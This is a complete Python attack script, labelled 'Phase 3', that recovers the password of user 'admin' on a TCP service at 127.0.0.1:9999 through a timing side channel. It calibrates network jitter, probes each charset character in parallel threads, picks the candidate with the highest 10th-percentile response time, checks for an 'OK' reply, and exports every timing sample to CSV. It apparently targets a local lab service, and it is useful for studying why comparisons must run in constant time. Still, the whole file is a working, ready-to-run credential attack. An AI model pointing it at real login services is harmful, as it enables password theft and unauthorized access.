#!/usr/bin/env python3
"""
Phase 3 — timing side-channel password recovery.
Recovers the password character-by-character using response-time differentials.
"""

import csv
import socket
import statistics
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

HOST = "127.0.0.1"
PORT = 9999
USER = "admin"
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"
FILLER = "x"          # padding appended after the test char — mismatch is instant
MAX_POSITIONS = 16    # hard stop; verify-on-OK will exit sooner
WORKERS = 8
CALIBRATION_SAMPLES = 30

_csv_rows: list[dict] = []


# ---------------------------------------------------------------------------
# Network primitives
# ---------------------------------------------------------------------------

def _send(payload: str) -> tuple[float, str]:
    """Single round-trip; returns (elapsed_ms, response_stripped)."""
    with socket.create_connection((HOST, PORT), timeout=5) as s:
        start = time.perf_counter()
        s.sendall((payload + "\n").encode())
        response = s.recv(16).decode().strip()
        return (time.perf_counter() - start) * 1000, response


def _percentile(data: list[float], p: float) -> float:
    """Return the p-th percentile of *data* using linear interpolation.

    Args:
        data: sample values (any order).
        p:    percentile in [0, 100].

    Returns:
        Interpolated value at the requested percentile.
    """
    s = sorted(data)
    k = (len(s) - 1) * p / 100
    lo = int(k)
    frac = k - lo
    if frac == 0 or lo + 1 >= len(s):
        return s[lo]
    return s[lo] + frac * (s[lo + 1] - s[lo])


# ---------------------------------------------------------------------------
# Calibration — choose N samples based on observed jitter
# ---------------------------------------------------------------------------

def calibrate() -> int:
    """Measure baseline RTT jitter and return an appropriate sample count N.

    Sends ``CALIBRATION_SAMPLES`` probes of a known-wrong password, computes
    the standard deviation, and maps it to N via a conservative ladder so that
    the p10 standard error stays well below the ~5 ms per-character signal.

    Returns:
        N — number of samples to collect per candidate during the attack.
    """
    print("[*] Calibrating noise floor …")
    times = [_send(f"{USER}:{'x' * 8}")[0] for _ in range(CALIBRATION_SAMPLES)]
    stdev = statistics.stdev(times)
    mean  = statistics.mean(times)
    print(f"    Baseline RTT  mean={mean:.2f} ms   stdev={stdev:.2f} ms")

    # Need p10 std-error well below the ~5 ms signal.
    # Conservative ladder based on jitter magnitude.
    if stdev < 0.5:
        n = 5
    elif stdev < 1.5:
        n = 8
    elif stdev < 3.0:
        n = 15
    else:
        n = 25

    print(f"    Chosen N      {n} samples per candidate\n")
    return n


# ---------------------------------------------------------------------------
# Per-character worker — runs in thread pool
# ---------------------------------------------------------------------------

def _probe_char(position: int, char: str, known: str, n: int
                ) -> tuple[str, float, list[float]]:
    """
    Probe `known + char + filler` n times.
    Returns (char, p10_ms, all_samples_ms).
    The filler ensures the candidate is long enough to reach position+1;
    it mismatches immediately, so it adds no meaningful latency.
    """
    candidate = known + char + FILLER * 4
    payload   = f"{USER}:{candidate}"
    times = [_send(payload)[0] for _ in range(n)]
    return char, _percentile(times, 10), times


# ---------------------------------------------------------------------------
# Main attack loop
# ---------------------------------------------------------------------------

def attack() -> str:
    """Recover the password character by character using timing differentials.

    For each position, all 36 charset candidates are probed in parallel via a
    ``ThreadPoolExecutor``.  The candidate whose p10 RTT is highest matched one
    extra character inside the server and is locked in.  The loop exits early
    when the server returns ``OK`` for the accumulated prefix.

    Returns:
        The recovered plaintext password string.
    """
    n = calibrate()

    header = f"{'Pos':<4} {'Char':<6} {'p10(ms)':>8}  {'Delta(ms)':>10}  {'Runner-up':<10}  Known so far"
    print(header)
    print("─" * len(header))

    known = ""

    for position in range(MAX_POSITIONS):
        results: dict[str, tuple[float, list[float]]] = {}

        with ThreadPoolExecutor(max_workers=WORKERS) as pool:
            futures = {
                pool.submit(_probe_char, position, ch, known, n): ch
                for ch in CHARSET
            }
            for fut in as_completed(futures):
                char, p10_val, times = fut.result()
                results[char] = (p10_val, times)
                ts = datetime.now().isoformat()
                for i, t in enumerate(times):
                    _csv_rows.append({
                        "position":        position,
                        "candidate_char":  char,
                        "full_candidate":  known + char + FILLER * 4,
                        "sample_index":    i,
                        "response_ms":     round(t, 4),
                        "timestamp":       ts,
                    })

        ranked = sorted(results.items(), key=lambda kv: kv[1][0], reverse=True)
        winner_char, (winner_p10, _) = ranked[0]
        runner_char, (runner_p10, _) = ranked[1]
        delta = winner_p10 - runner_p10

        known += winner_char

        flag = "  [!] weak signal" if delta < 1.5 else ""
        print(
            f"[+] Position {position} → {winner_char!r}"
            f"  p10={winner_p10:.1f} ms"
            f"  delta={delta:.1f} ms"
            f"  runner-up={runner_char!r}"
            f"  known={known!r}{flag}"
        )

        # Verify — server returns OK only on an exact full match
        _, response = _send(f"{USER}:{known}")
        if response == "OK":
            print(f"\n[*] Server confirmed OK — password recovered after {len(known)} chars.")
            break

    return known


# ---------------------------------------------------------------------------
# CSV export
# ---------------------------------------------------------------------------

def save_csv(path: str = "timing_results.csv") -> None:
    """Write all accumulated probe timings to *path* as a CSV file.

    Columns: position, candidate_char, full_candidate, sample_index,
    response_ms, timestamp.  Each row is one individual probe.

    Args:
        path: destination file path (created or overwritten).
    """
    if not _csv_rows:
        return
    fields = ["position", "candidate_char", "full_candidate",
              "sample_index", "response_ms", "timestamp"]
    with open(path, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=fields)
        writer.writeheader()
        writer.writerows(_csv_rows)
    print(f"[*] {len(_csv_rows)} raw timing rows saved to {path}")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    """Entry point: run the attack, print results, and export timing data."""
    print(f"Timing side-channel attacker  →  {HOST}:{PORT}\n")
    t0 = time.perf_counter()

    recovered = attack()

    elapsed = time.perf_counter() - t0
    print(f"\n[=] Recovered password : {recovered!r}")
    print(f"[=] Total time         : {elapsed:.1f} s")
    save_csv()


if __name__ == "__main__":
    main()
